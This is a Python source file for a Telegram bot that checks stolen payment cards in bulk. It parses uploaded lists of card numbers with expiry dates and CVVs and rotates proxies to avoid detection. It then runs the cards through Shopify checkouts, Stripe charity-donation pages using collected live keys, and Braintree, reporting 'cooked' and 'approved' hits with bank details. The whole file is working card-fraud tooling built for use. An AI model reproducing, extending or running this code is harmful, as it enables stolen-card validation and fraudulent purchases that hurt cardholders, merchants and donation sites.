import requests
import time
import threading
import random
import logging
import re
import csv
import os
import urllib3
import traceback
import json
import gates  # our new gates.py
from concurrent.futures import ThreadPoolExecutor, as_completed
from telebot import types
import autosh

OWNER_ID = [5963548505, 1614278744]

USER_PROXIES_FILE = "user_proxies.json"

def load_user_proxies():
    if os.path.exists(USER_PROXIES_FILE):
        with open(USER_PROXIES_FILE, 'r') as f:
            return json.load(f)
    return {}

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [%(levelname)s] - %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger(__name__)

user_sessions = {}
BINS_CSV_FILE = 'bins_all.csv'
MAX_RETRIES = 2
PROXY_TIMEOUT = 5
BIN_DB = {}

def load_bin_database():
    global BIN_DB
    if not os.path.exists(BINS_CSV_FILE):
        logger.warning(f"⚠️ System: BIN CSV file '{BINS_CSV_FILE}' not found.")
        return
    try:
        with open(BINS_CSV_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            reader = csv.reader(f)
            next(reader, None)
            for row in reader:
                if len(row) >= 6:
                    BIN_DB[row[0].strip()] = {
                        'country_name': row[1].strip(),
                        'country_flag': get_flag_emoji(row[1].strip()),
                        'brand': row[2].strip(),
                        'type': row[3].strip(),
                        'level': row[4].strip(),
                        'bank': row[5].strip()
                    }
    except Exception as e:
        logger.error(f"❌ Error loading BIN CSV: {e}")

def get_flag_emoji(country_code):
    if not country_code or len(country_code) != 2: return "🇺🇳"
    return "".join([chr(ord(c.upper()) + 127397) for c in country_code])

load_bin_database()

def get_bin_info(card_number):
    clean_cc = re.sub(r'\D', '', str(card_number))
    bin_code = clean_cc[:6]
    if bin_code in BIN_DB: return BIN_DB[bin_code]
    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=3)
        if response.status_code == 200:
            data = response.json()
            return {
                'country_name': data.get('country_name', 'Unknown'),
                'country_flag': data.get('country_flag', '🇺🇳'),
                'brand': data.get('brand', 'Unknown'),
                'type': data.get('type', 'Unknown'),
                'level': data.get('level', 'Unknown'),
                'bank': data.get('bank', 'Unknown')
            }
    except: pass
    return {'country_name': 'Unknown', 'country_flag': '🇺🇳', 'bank': 'UNKNOWN', 'brand': 'UNKNOWN', 'type': 'UNKNOWN', 'level': 'UNKNOWN'}

def extract_cards_from_text(text):
    valid_ccs = []
    text = text.replace(',', '\n').replace(';', '\n')
    lines = text.split('\n')
    for line in lines:
        line = line.strip()
        if len(line) < 15: continue
        match = re.search(r'(\d{13,19})[|:/\s](\d{1,2})[|:/\s](\d{2,4})[|:/\s](\d{3,4})', line)
        if match:
            cc, mm, yyyy, cvv = match.groups()
            if len(yyyy) == 2: yyyy = "20" + yyyy
            mm = mm.zfill(2)
            if 1 <= int(mm) <= 12:
                valid_ccs.append(f"{cc}|{mm}|{yyyy}|{cvv}")
    return list(set(valid_ccs))

def create_progress_bar(processed, total, length=15):
    if total == 0: return ""
    percent = processed / total
    filled_length = int(length * percent)
    return f"<code>{'█' * filled_length}{'░' * (length - filled_length)}</code> {int(percent * 100)}%"

def validate_proxies_strict(proxies, bot, message):
    live_proxies = []
    total = len(proxies)
    status_msg = bot.reply_to(message, f"🛡️ <b>Verifying {total} Proxies...</b>", parse_mode='HTML')
    last_ui_update = time.time()
    checked = 0

    def check(proxy_str):
        try:
            parts = proxy_str.split(':')
            if len(parts) == 2: url = f"http://{parts[0]}:{parts[1]}"
            elif len(parts) == 4: url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            else: return False
            requests.get("http://httpbin.org/ip", proxies={'http': url, 'https': url}, timeout=PROXY_TIMEOUT)
            return True
        except: return False

    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(check, p): p for p in proxies}
        for future in as_completed(futures):
            checked += 1
            if future.result(): live_proxies.append(futures[future])
            if time.time() - last_ui_update > 2:
                try:
                    bot.edit_message_text(f"🛡️ <b>Verifying Proxies</b>\n✅ Live: {len(live_proxies)}\n💀 Dead: {checked - len(live_proxies)}\n📊 {checked}/{total}", message.chat.id, status_msg.message_id, parse_mode='HTML')
                    last_ui_update = time.time()
                except: pass

    try: bot.delete_message(message.chat.id, status_msg.message_id)
    except: pass
    return live_proxies

# ============================================================================
# 🔧 WRAPPER FOR SHOPIFY (using autosh)
# ============================================================================
def check_site_shopify_direct(site_url, cc, proxy=None):
    try:
        result_json = autosh.ShopProcessor().process(cc, site_url, proxy)
        result = json.loads(result_json)
        response_text = result.get('Response', 'Unknown')
        price = result.get('Price', '0.00')
        gateway = result.get('Gateway', 'Shopify Full Flow')

        response_upper = response_text.upper()
        if 'THANK YOU FOR YOUR PURCHASE' in response_upper or 'ORDER PLACED' in response_upper:
            status = 'APPROVED'
        elif 'INCORRECT_ZIP' in response_upper:
            status = 'DECLINED'
        elif 'INSUFFICIENT_FUNDS' in response_upper:
            status = 'DECLINED'
        elif 'INCORRECT_CVC' in response_upper:
            status = 'DECLINED'
        elif '3DS' in response_upper or 'ACTION_REQUIRED' in response_upper:
            status = 'APPROVED_OTP'
        elif 'CAPTCHA' in response_upper:
            status = 'ERROR'
        elif 'NO_PAYMENT_ID' in response_upper:
            status = 'DECLINED'
        elif 'TOKENIZATION FAILED' in response_upper:
            status = 'ERROR'
        else:
            decline_keywords = ['DECLINED', 'CARD DECLINED', 'EXPIRED', 'FRAUD', 'DO NOT HONOR']
            if any(k in response_upper for k in decline_keywords):
                status = 'DECLINED'
            else:
                status = 'UNKNOWN'

        return {
            'Response': response_text,
            'status': status,
            'gateway': gateway,
            'price': price,
            'message': response_text
        }
    except Exception as e:
        return {
            'Response': f'Error: {str(e)}',
            'status': 'ERROR',
            'gateway': 'Shopify Full Flow',
            'price': '0.00',
            'message': str(e)
        }

# ============================================================================
# 🚀 MAIN HANDLER SETUP
# ============================================================================
def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
                          check_site_func, is_valid_response_func,
                          process_response_func, update_stats_func, save_json_func,
                          is_user_allowed_func):

    @bot.message_handler(content_types=['document'])
    def handle_file_upload_event(message):
        if not is_user_allowed_func(message.from_user.id):
            bot.reply_to(message, "🚫 <b>Access Denied:</b> Contact Admin.", parse_mode='HTML')
            return

        try:
            file_name = message.document.file_name.lower()
            if not file_name.endswith('.txt'):
                bot.reply_to(message, "❌ <b>Format Error:</b> Only .txt files.", parse_mode='HTML')
                return

            msg_loading = bot.reply_to(message, "⏳ <b>Reading File...</b>", parse_mode='HTML')

            file_info = bot.get_file(message.document.file_id)
            file_content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')

            ccs = extract_cards_from_text(file_content)

            if ccs:
                user_id = message.from_user.id
                if user_id not in user_sessions: user_sessions[user_id] = {}
                user_sessions[user_id]['ccs'] = ccs
                user_sessions[user_id]['proxies'] = []

                markup = types.InlineKeyboardMarkup(row_width=1)
                markup.add(
                    types.InlineKeyboardButton("🛍️ Shopify Mass (Multi-Site)", callback_data="run_mass_shopify"),
                    types.InlineKeyboardButton("💳 Stripe Auth (ConfigDB)", callback_data="run_mass_stripe_configdb"),
                    types.InlineKeyboardButton("💰 Braintree $50", callback_data="run_mass_braintree"),
                    types.InlineKeyboardButton("💳 Stripe Donation (Multi)", callback_data="run_mass_stripe_donation"),
                    types.InlineKeyboardButton("❌ Cancel", callback_data="action_cancel")
                )

                bot.edit_message_text(
                    f"📂 <b>File:</b> <code>{file_name}</code>\n"
                    f"💳 <b>Cards:</b> {len(ccs)}\n"
                    f"<b>⚡ Select Checking Gate:</b>",
                    message.chat.id, msg_loading.message_id, reply_markup=markup, parse_mode='HTML'
                )
            else:
                proxies = [line.strip() for line in file_content.split('\n') if ':' in line]
                if proxies:
                    user_id = message.from_user.id
                    if user_id not in user_sessions: user_sessions[user_id] = {}
                    user_sessions[user_id]['proxies'] = proxies
                    bot.edit_message_text(f"🔌 <b>Proxies Loaded:</b> {len(proxies)}\n✅ You can now run Mass Check.", message.chat.id, msg_loading.message_id, parse_mode='HTML')
                else:
                    bot.edit_message_text("❌ No valid CCs or Proxies found.", message.chat.id, msg_loading.message_id)

        except Exception as e:
            bot.reply_to(message, f"❌ Error: {e}")

    @bot.message_handler(commands=['msh', 'hardcook'])
    def handle_mass_check_command(message):
        if not is_user_allowed_func(message.from_user.id):
            bot.send_message(message.chat.id, "🚫 <b>Access Denied</b>", parse_mode='HTML')
            return

        user_id = message.from_user.id
        if user_id not in user_sessions or 'ccs' not in user_sessions[user_id] or not user_sessions[user_id]['ccs']:
            bot.send_message(message.chat.id, "⚠️ <b>Upload CCs first!</b>", parse_mode='HTML')
            return

        ccs = user_sessions[user_id]['ccs']
        sites = get_filtered_sites_func()

        if not sites:
            bot.send_message(message.chat.id, "❌ <b>No sites available!</b> Add sites via /addurls", parse_mode='HTML')
            return

        active_proxies = []
        user_proxies = user_sessions[user_id].get('proxies', [])

        if user_proxies:
            active_proxies = validate_proxies_strict(user_proxies, bot, message)
            source = f"🔒 User ({len(active_proxies)})"
        else:
            server_proxies = proxies_data.get('proxies', [])
            if server_proxies:
                active_proxies = server_proxies
                source = f"🌍 Server ({len(active_proxies)})"
            else:
                bot.send_message(message.chat.id, "❌ <b>No Proxies Available!</b> Upload proxies or add server proxies.", parse_mode='HTML')
                return

        if not active_proxies:
            bot.send_message(message.chat.id, "❌ <b>All Proxies Dead.</b>", parse_mode='HTML')
            return

        start_msg = bot.send_message(message.chat.id, f"🔥 <b>Starting...</b>\n💳 {len(ccs)} Cards\n🔌 {source}", parse_mode='HTML')

        threading.Thread(
            target=process_mass_check_engine,
            args=(bot, message, start_msg, ccs, sites, active_proxies,
                  check_site_func, process_response_func, update_stats_func)
        ).start()

    # ==========================================================================
    # HELPER FUNCTIONS INSIDE SETUP_COMPLETE_HANDLER
    # ==========================================================================
    def get_active_proxies(user_id):
        user_id = str(user_id)
        if int(user_id) in user_sessions and user_sessions[int(user_id)].get('proxies'):
            return user_sessions[int(user_id)]['proxies']
        saved_proxies = load_user_proxies()
        if user_id in saved_proxies and saved_proxies[user_id]:
            return saved_proxies[user_id]
        if int(user_id) in OWNER_ID:
            if proxies_data and 'proxies' in proxies_data and proxies_data['proxies']:
                return proxies_data['proxies']
        return None

    # ==========================================================================
    # CALLBACK HANDLERS
    # ==========================================================================
    @bot.callback_query_handler(func=lambda call: call.data == "run_mass_shopify")
    def callback_shopify(call):
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
            user_id = call.from_user.id
            if user_id not in user_sessions or 'ccs' not in user_sessions[user_id]:
                bot.send_message(call.message.chat.id, "⚠️ Session expired. Upload file again.")
                return

            proxies = get_active_proxies(user_id)
            if not proxies:
                bot.send_message(
                    call.message.chat.id,
                    "🚫 <b>Proxy Required!</b>\n\n"
                    "You have 0 proxies in your pool.\n"
                    "<b>To add proxies:</b>\n"
                    "1. Upload a <code>.txt</code> file\n"
                    "2. OR use <code>/addpro ip:port:user:pass</code>",
                    parse_mode='HTML'
                )
                return

            process_mass_check_engine(
                bot, call.message, None,
                user_sessions[user_id]['ccs'],
                get_filtered_sites_func(),
                proxies,
                check_site_shopify_direct,
                process_response_func,
                update_stats_func
            )
        except Exception as e:
            bot.send_message(call.message.chat.id, f"❌ Error: {e}")

    @bot.callback_query_handler(func=lambda call: call.data == "run_mass_stripe_configdb")
    def callback_stripe_configdb(call):
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
            user_id = call.from_user.id
            if user_id not in user_sessions or 'ccs' not in user_sessions[user_id]:
                bot.send_message(call.message.chat.id, "⚠️ Session expired. Upload file again.")
                return

            proxies = get_active_proxies(user_id)
            if not proxies:
                bot.send_message(call.message.chat.id, "🚫 Proxy Required!", parse_mode='HTML')
                return

            process_mass_gate_check(
                bot, call.message,
                user_sessions[user_id]['ccs'],
                gates.check_stripe_configdb,
                "Stripe Auth (ConfigDB)",
                proxies
            )
        except Exception as e:
            bot.send_message(call.message.chat.id, f"❌ Error: {e}")

    @bot.callback_query_handler(func=lambda call: call.data == "run_mass_braintree")
    def callback_braintree(call):
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
            user_id = call.from_user.id
            if user_id not in user_sessions or 'ccs' not in user_sessions[user_id]:
                bot.send_message(call.message.chat.id, "⚠️ Session expired. Upload file again.")
                return

            proxies = get_active_proxies(user_id)
            if not proxies:
                bot.send_message(call.message.chat.id, "🚫 Proxy Required!", parse_mode='HTML')
                return

            process_mass_gate_check(
                bot, call.message,
                user_sessions[user_id]['ccs'],
                gates.check_braintree,
                "Braintree $50",
                proxies
            )
        except Exception as e:
            bot.send_message(call.message.chat.id, f"❌ Error: {e}")

    @bot.callback_query_handler(func=lambda call: call.data == "run_mass_stripe_donation")
    def callback_stripe_donation(call):
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
            user_id = call.from_user.id
            if user_id not in user_sessions or 'ccs' not in user_sessions[user_id]:
                bot.send_message(call.message.chat.id, "⚠️ Session expired. Upload file again.")
                return

            proxies = get_active_proxies(user_id)
            if not proxies:
                bot.send_message(call.message.chat.id, "🚫 Proxy Required!", parse_mode='HTML')
                return

            process_mass_gate_check(
                bot, call.message,
                user_sessions[user_id]['ccs'],
                gates.check_stripe_donation,
                "Stripe Donation (Multi)",
                proxies
            )
        except Exception as e:
            bot.send_message(call.message.chat.id, f"❌ Error: {e}")

    @bot.callback_query_handler(func=lambda call: call.data == "action_cancel")
    def callback_cancel(call):
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
            bot.send_message(call.message.chat.id, "❌ Operation cancelled.")
        except Exception as e:
            bot.send_message(call.message.chat.id, f"❌ Error: {e}")

    # ============================================================================
    # 📥 COMMAND: /stsite - Upload Stripe Donation Sites
    # ============================================================================
    @bot.message_handler(commands=['stsite'])
    def handle_stsite_command(message):
        if message.from_user.id not in OWNER_ID:
            bot.reply_to(message, "🚫 Owner only command.")
            return

        bot.reply_to(
            message,
            "📤 **Send a .txt file** containing Stripe donation sites.\n"
            "Format: `URL | pk_live_xxxx`\n"
            "Example: `https://example.com/donate | pk_live_abc123`\n"
            "One per line. The site will be added as GiveWP type.",
            parse_mode='Markdown'
        )
        bot.register_next_step_handler(message, process_stsite_file)

    def process_stsite_file(message):
        if not message.document or not message.document.file_name.endswith('.txt'):
            bot.reply_to(message, "❌ Please send a **.txt** file.")
            return

        try:
            file_info = bot.get_file(message.document.file_id)
            file_content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')

            added = 0
            new_sites = []
            lines = file_content.split('\n')

            donation_file = "donation_sites.json"
            if os.path.exists(donation_file):
                with open(donation_file, 'r') as f:
                    sites = json.load(f)
            else:
                sites = []

            for line in lines:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                match = re.search(r'(https?://[^\s|]+)[\s|]+(pk_live_[a-zA-Z0-9]+)', line)
                if match:
                    url = match.group(1).rstrip('/')
                    pk = match.group(2)
                    if not any(s['url'] == url for s in sites):
                        sites.append({
                            'url': url,
                            'pk': pk,
                            'type': 'givewp'
                        })
                        added += 1
                        new_sites.append(f"{url} | {pk}")

            with open(donation_file, 'w') as f:
                json.dump(sites, f, indent=2)

            report = f"✅ **Added {added} new donation sites.**\n\n"
            if new_sites:
                report += "**New sites:**\n" + "\n".join(new_sites[:10])
                if len(new_sites) > 10:
                    report += f"\n... and {len(new_sites)-10} more"
            else:
                report += "No new sites added (all duplicates or invalid format)."

            bot.reply_to(message, report, parse_mode='Markdown')

        except Exception as e:
            bot.reply_to(message, f"❌ Error: {str(e)}")

    # ============================================================================
    # 🧠 MASS CHECK ENGINE
    # ============================================================================
    def process_mass_check_engine(bot, message, status_msg, ccs, sites, proxies, check_site_func, process_response_func, update_stats_func):
        results = {'cooked': [], 'approved': [], 'declined': [], 'error': []}
        total = len(ccs)
        processed = 0
        start_time = time.time()
        last_update_time = time.time()

        def worker(cc):
            attempts = 0
            while attempts < MAX_RETRIES:
                try:
                    site = random.choice(sites)
                    proxy = random.choice(proxies)
                    api_response = check_site_func(site['url'], cc, proxy)

                    if not api_response:
                        attempts += 1; continue

                    resp_text, status, gateway = process_response_func(api_response, site.get('price', '0'))

                    if any(x in resp_text.upper() for x in ["PROXY", "TIMEOUT", "CAPTCHA"]):
                        attempts += 1; continue

                    return {'cc': cc, 'status': status, 'response': resp_text, 'gateway': gateway, 'price': site.get('price', '0'), 'site_url': site['url']}
                except: attempts += 1
            return {'cc': cc, 'status': 'ERROR', 'response': 'Dead/Timeout', 'gateway': 'Unknown', 'price': '0', 'site_url': 'N/A'}

        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(worker, cc): cc for cc in ccs}
            for future in as_completed(futures):
                processed += 1
                res = future.result()

                if res['status'] == 'APPROVED':
                    if any(x in res['response'].upper() for x in ["THANK", "CONFIRMED", "SUCCESS"]):
                        results['cooked'].append(res)
                        update_stats_func('COOKED', True)
                        send_hit(bot, message.chat.id, res, "🔥 COOKED")
                    else:
                        results['approved'].append(res)
                        update_stats_func('APPROVED', True)
                        send_hit(bot, message.chat.id, res, "✅ APPROVED")
                elif res['status'] == 'APPROVED_OTP':
                    results['approved'].append(res)
                    update_stats_func('APPROVED_OTP', True)
                    send_hit(bot, message.chat.id, res, "✅ APPROVED (OTP)")
                elif res['status'] == 'DECLINED':
                    results['declined'].append(res)
                    update_stats_func('DECLINED', True)
                else:
                    results['error'].append(res)

                if time.time() - last_update_time > 3 or processed == total:
                    update_ui(bot, message.chat.id, status_msg.message_id, processed, total, results)
                    last_update_time = time.time()

        duration = time.time() - start_time
        send_final(bot, message.chat.id, status_msg.message_id, total, results, duration)

    def process_mass_gate_check(bot, message, ccs, gate_func, gate_name, proxies):
        total = len(ccs)
        results = {'cooked': [], 'approved': [], 'declined': [], 'error': []}

        try:
            status_msg = bot.send_message(
                message.chat.id,
                f"🔥 <b>{gate_name} Started...</b>\n"
                f"💳 Cards: {total}\n"
                f"🔌 Proxies: {len(proxies)}",
                parse_mode='HTML'
            )
        except:
            status_msg = bot.send_message(message.chat.id, f"🔥 <b>{gate_name} Started...</b>", parse_mode='HTML')

        processed = 0
        start_time = time.time()
        last_update = time.time()

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {}
            for cc in ccs:
                proxy = random.choice(proxies)
                futures[executor.submit(gate_func, cc, proxy)] = cc

            for future in as_completed(futures):
                cc = futures[future]
                processed += 1

                try:
                    response_text, status = future.result()

                    res_obj = {
                        'cc': cc,
                        'response': response_text,
                        'status': status,
                        'gateway': gate_name,
                        'price': 'N/A',
                        'site_url': 'API'
                    }

                    if status == 'APPROVED':
                        results['cooked'].append(res_obj)
                        send_hit(bot, message.chat.id, res_obj, f"✅ {gate_name} HIT")
                    elif status == 'APPROVED_OTP':
                        results['approved'].append(res_obj)
                        send_hit(bot, message.chat.id, res_obj, f"⚠️ {gate_name} AUTH")
                    elif status == 'DECLINED':
                        results['declined'].append(res_obj)
                    else:
                        results['error'].append(res_obj)

                    if time.time() - last_update > 3:
                        msg = (
                            f"⚡ <b>{gate_name} Checking...</b>\n"
                            f"{create_progress_bar(processed, total)}\n"
                            f"<b>Progress:</b> {processed}/{total}\n"
                            f"✅ <b>Live:</b> {len(results['cooked'])}\n"
                            f"❌ <b>Dead:</b> {len(results['declined'])}\n"
                            f"⚠️ <b>Error:</b> {len(results['error'])}"
                        )
                        try:
                            bot.edit_message_text(msg, message.chat.id, status_msg.message_id, parse_mode='HTML')
                            last_update = time.time()
                        except: pass

                except Exception as e:
                    print(f"Check Error for {cc}: {e}")
                    results['error'].append({'cc': cc, 'response': str(e), 'status': 'ERROR'})

        duration = time.time() - start_time
        final_msg = (
            f"✅ <b>{gate_name} Completed</b>\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"💳 <b>Total:</b> {total}\n"
            f"✅ <b>Live:</b> {len(results['cooked'])}\n"
            f"❌ <b>Dead:</b> {len(results['declined'])}\n"
            f"⚠️ <b>Errors:</b> {len(results['error'])}\n"
            f"⏱️ <b>Time:</b> {duration:.2f}s"
        )

        try:
            bot.edit_message_text(final_msg, message.chat.id, status_msg.message_id, parse_mode='HTML')
        except:
            bot.send_message(message.chat.id, final_msg, parse_mode='HTML')

    # ============================================================================
    # 📩 MESSAGING
    # ============================================================================
    def send_hit(bot, chat_id, res, title):
        try:
            bin_info = get_bin_info(res['cc'])
            site_name = res['site_url'].replace('https://', '').split('/')[0]
            msg = f"""
┏━━━━━━━⍟
┃ <b>{title} HIT!</b>
┗━━━━━━━━━━━⊛
💳 <b>Card:</b> <code>{res['cc']}</code>
💰 <b>Resp:</b> {res['response']}
💲 <b>Amt:</b> ${res['price']}
🌐 <b>Site:</b> {site_name}
🔌 <b>Gate:</b> {res['gateway']}
🏳️ <b>Info:</b> {bin_info.get('country_flag','')} {bin_info.get('bank','')}
━━━━━━━━━━━━━━━━━━━━
"""
            bot.send_message(chat_id, msg, parse_mode='HTML')
        except: pass

    def update_ui(bot, chat_id, mid, processed, total, results):
        try:
            msg = f"""
┏━━━━━━━⍟
┃ <b>⚡ MASS CHECKING...</b>
┗━━━━━━━━━━━⊛
{create_progress_bar(processed, total)}
<b>Progress:</b> {processed}/{total}
🔥 <b>Cooked:</b> {len(results['cooked'])}
✅ <b>Approved:</b> {len(results['approved'])}
❌ <b>Declined:</b> {len(results['declined'])}
⚠️ <b>Errors:</b> {len(results['error'])}
"""
            bot.edit_message_text(msg, chat_id, mid, parse_mode='HTML')
        except: pass

    def send_final(bot, chat_id, mid, total, results, duration):
        msg = f"""
┏━━━━━━━⍟
┃ <b>✅ CHECK COMPLETED</b>
┗━━━━━━━━━━━⊛
🔥 <b>Cooked:</b> {len(results['cooked'])}
✅ <b>Approved:</b> {len(results['approved'])}
❌ <b>Declined:</b> {len(results['declined'])}
<b>Total:</b> {total} | <b>Time:</b> {duration:.2f}s
"""
        try: bot.edit_message_text(msg, chat_id, mid, parse_mode='HTML')
        except: bot.send_message(chat_id, msg, parse_mode='HTML')